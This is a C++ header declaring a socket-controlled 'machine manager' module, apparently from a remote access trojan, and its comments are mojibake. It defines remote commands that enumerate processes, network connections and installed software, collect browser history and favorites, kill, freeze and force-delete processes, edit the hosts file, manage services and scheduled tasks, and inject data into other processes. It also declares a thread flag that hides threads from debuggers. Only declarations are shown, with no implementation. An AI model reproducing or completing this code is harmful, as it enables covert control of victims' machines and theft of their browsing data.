#pragma once
#include "Manager.h"
#include <Iphlpapi.h>     
#include <tlhelp32.h>     
#include <map>
#include <WINSOCK2.H>    

#pragma comment(lib, "Iphlpapi.lib")     
#pragma comment(lib, "WS2_32.lib")   

#include <taskschd.h>
#include <comutil.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

typedef std::map<DWORD, std::wstring*> PidandStitle; //����ID�봰����
#define MAKE_PAIR(_a,b,c) _a::value_type((b),(c))

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED	0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH  0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER	0x00000004

enum MACHINE
{

	COMMAND_MACHINE_PROCESS,
	COMMAND_MACHINE_WINDOWS,
	COMMAND_MACHINE_NETSTATE,
	COMMAND_MACHINE_SOFTWARE,
	COMMAND_MACHINE_HTML,
	COMMAND_MACHINE_FAVORITES,
	COMMAND_MACHINE_WIN32SERVICE,
	COMMAND_MACHINE_DRIVERSERVICE,
	COMMAND_MACHINE_TASK,
	COMMAND_MACHINE_HOSTS, //���������



	COMMAND_APPUNINSTALL,//ж��
	COMMAND_WINDOW_OPERATE,//���ڿ���
	COMMAND_WINDOW_CLOSE,//�ر�
	COMMAND_PROCESS_KILL,//��������
	COMMAND_PROCESS_KILLDEL,//��������----ɾ��
	COMMAND_PROCESS_DEL,//ǿ��ɾ�� ����Ҫ��������
	COMMAND_PROCESS_FREEZING,//����	
	COMMAND_PROCESS_THAW,//�ⶳ
	COMMAND_HOSTS_SET,//hosts

	COMMAND_SERVICE_LIST_WIN32,
	COMMAND_SERVICE_LIST_DRIVER,
	COMMAND_DELETESERVERICE,
	COMMAND_STARTSERVERICE,
	COMMAND_STOPSERVERICE,
	COMMAND_PAUSESERVERICE,
	COMMAND_CONTINUESERVERICE,


	COMMAND_TASKCREAT,
	COMMAND_TASKDEL,
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_INJECT,

	TOKEN_MACHINE_PROCESS,
	TOKEN_MACHINE_WINDOWS,
	TOKEN_MACHINE_NETSTATE,
	TOKEN_MACHINE_SOFTWARE,
	TOKEN_MACHINE_HTML,
	TOKEN_MACHINE_FAVORITES,
	TOKEN_MACHINE_WIN32SERVICE,
	TOKEN_MACHINE_DRIVERSERVICE,
	TOKEN_MACHINE_HOSTS,
	TOKEN_MACHINE_SERVICE_LIST,
	TOKEN_MACHINE_TASKLIST,

	TOKEN_MACHINE_MSG,
};









class CMachineManager : public CManager
{
public:
	BOOL m_buser;
	CMachineManager(ISocketBase* pClient);
	virtual ~CMachineManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	static BOOL DebugPrivilege(const TCHAR* PName, BOOL bEnable);
	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
	HWND GetHwndByPid(DWORD dwProcessID);
	bool Is64BitOS();
	bool Is64BitPorcess(DWORD dwProcessID);
	TCHAR* ProcessPidToName(HANDLE hProcessSnap, DWORD ProcessId, TCHAR* ProcessName);
	wchar_t* char2wchar_t(char* cstr);
	BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
	LPBYTE	lpFUBuffer ;
	DWORD	dwFUOffset; // λ��ָ��

	void DeleteService(LPBYTE lpBuffer, UINT nSize);
	void MyControlService(LPBYTE lpBuffer, UINT nType);


	void SendProcessList();
	LPBYTE getProcessList();	//����

	void SendWindowsList();
	LPBYTE getWindowsList();	//����

	void SendNetStateList();
	LPBYTE getNetStateList();

	void SendSoftWareList();
	LPBYTE getSoftWareList();	//����б�

	void SendIEHistoryList();
	LPBYTE getIEHistoryList(); //html�����¼

	void SendFavoritesUrlList();
	void FindFavoritesUrl(TCHAR* searchfilename);
	LPBYTE getFavoritesUrlList(); //�ղؼ�

	void SendServicesList(DWORD dwScType = SERVICE_WIN32);
	LPBYTE getServiceList(DWORD dwScType);
	DWORD	 dwServiceType;

	PBYTE GetTaskAll(ITaskFolder* pFolder);							//��ȡĿ¼�µ���������
	PBYTE GetFolderAll(ITaskFolder* pFolder);							//��ȡĿ¼�µ���Ŀ¼
	PBYTE GetRoot();																//��ȡ��Ŀ¼�µ����ļ���

	BOOL CreateTask(LPBYTE lpBuffer);							//�����ƻ�����
	BOOL RunOrStopTask(LPBYTE lpBuffer, BOOL Action);  //ִ�л�ֹͣ
	BOOL DelTask(LPBYTE lpBuffer);								//ɾ���ƻ�����
	BOOL GetProgramPath(ITaskDefinition* iDefinition, BSTR* exepath);
	void SaveData(BSTR taskname, BSTR path, BSTR exepath, TCHAR* status, DATE LastTime, DATE NextTime);  //�������ݵ�������
	ITaskService* pService;				//���Ӽƻ������
	PBYTE lpList;								//��������ƻ�������
	DWORD offset;								//ƫ��
	DWORD nBufferSize;						//�ڴ��С

	void SendHostsList();

	void injectprocess(DWORD mode, DWORD ExeIsx86, DWORD dwProcessID,byte* data, DWORD datasize,TCHAR* path);

	void SendError(TCHAR* Terror);
};




struct  WINDOWSINFO
{
	TCHAR strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};


struct  Browsinghistory
{
	TCHAR strTime[100];
	TCHAR strTitle[1024];
	TCHAR strUrl[1024];

};


typedef struct
{
	DWORD   dwState;          // ����״̬     
	DWORD   dwLocalAddr;      // ���ص�ַ     
	DWORD   dwLocalPort;      // ���ض˿�     
	DWORD   dwRemoteAddr;     // Զ�̵�ַ     
	DWORD   dwRemotePort;     // Զ�̶˿�     
	DWORD   dwProcessId;      // ����ID��     
} MIB_TCPEXROW, * PMIB_TCPEXROW;

typedef struct
{
	DWORD           dwNumEntries;
	MIB_TCPEXROW    table[ANY_SIZE];
} MIB_TCPEXTABLE, * PMIB_TCPEXTABLE;

typedef struct
{
	DWORD   dwLocalAddr;      // ���ص�ַ     
	DWORD   dwLocalPort;      // ���ض˿�     
	DWORD   dwProcessId;      // ����ID��     
} MIB_UDPEXROW, * PMIB_UDPEXROW;

typedef struct
{
	DWORD           dwNumEntries;
	MIB_UDPEXROW    table[ANY_SIZE];
} MIB_UDPEXTABLE, * PMIB_UDPEXTABLE;



typedef struct {
	DWORD dwState;      //����״̬
	DWORD dwLocalAddr;  //���ص�ַ
	DWORD dwLocalPort;  //���ض˿�
	DWORD dwRemoteAddr; //Զ�̵�ַ
	DWORD dwRemotePort; //Զ�̶˿�
	DWORD dwProcessId;  //���̱�ʶ
	DWORD Unknown;      //������ʶ
}MIB_TCPEXROW_VISTA, * PMIB_TCPEXROW_VISTA;

typedef struct {
	DWORD dwNumEntries;
	MIB_TCPEXROW_VISTA table[ANY_SIZE];
}MIB_TCPEXTABLE_VISTA, * PMIB_TCPEXTABLE_VISTA;

typedef DWORD(WINAPI* _InternalGetTcpTable2)(
	PMIB_TCPEXTABLE_VISTA* pTcpTable_Vista,
	HANDLE heap,
	DWORD flags
	);


typedef DWORD(WINAPI* PFNInternalGetUdpTableWithOwnerPid)(
	PMIB_UDPEXTABLE* pUdpTable,
	HANDLE heap,
	DWORD flags
	);
// ��չ����ԭ��     
typedef DWORD(WINAPI* PFNAllocateAndGetTcpExTableFromStack)(
	PMIB_TCPEXTABLE* pTcpTable,
	BOOL bOrder,
	HANDLE heap,
	DWORD zero,
	DWORD flags
	);

typedef DWORD(WINAPI* PFNAllocateAndGetUdpExTableFromStack)(
	PMIB_UDPEXTABLE* pUdpTable,
	BOOL bOrder,
	HANDLE heap,
	DWORD zero,
	DWORD flags
	);



struct  InjectData
{
	DWORD ExeIsx86;
	DWORD mode;		//ע��ģʽ
	DWORD dwProcessID;//����ID
	DWORD datasize;   //�������ݳߴ�
	TCHAR strpath[1024]; //Զ�����Ŀ¼
};









